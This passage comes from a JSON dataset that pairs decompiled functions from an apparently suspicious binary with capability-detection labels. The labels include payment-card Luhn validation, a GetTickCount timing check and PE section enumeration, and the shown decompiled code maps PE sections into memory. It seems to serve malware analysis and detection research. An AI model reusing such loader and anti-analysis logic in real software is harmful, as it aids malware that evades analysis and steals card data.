uStack32 = 0xdfbe2170;\n    uVar3 = fcn.0041b8b1(auStack104, 0);\n    return uVar3;\n}\n",
        "token_count": 1002
    },
    "0041e944": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop",
            "enumerate PE sections"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.0041e944(int32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t iStack96;\n    uint32_t uStack92;\n    uint var_ch;\n    \n    iVar1 = 0;\n    if (*(arg_ch + *(arg_ch + 0x3c)) == 0x4550) {\n        iVar1 = arg_ch + *(arg_ch + 0x3c);\n    }\n    if (*(iVar1 + 6) != 0) {\n        iStack96 = *(iVar1 + 0x14) + 0x18 + iVar1;\n        uStack92 = 0;\n        do {\n            fcn.0041e4e4(arg_8h + *(iStack96 + 0xc), arg_ch + *(iStack96 + 0x14), *(iStack96 + 0x10));\n            uStack92 = uStack92 + 1;\n            iStack96 = iStack96 + 0x28;\n        } while (uStack92 < *(iVar1 + 6));\n    }\n    fcn.0041e4e4(arg_8h, arg_ch, *(iVar1 + 0x54));\n    return;\n}\n",
        "token_count": 288
    }
}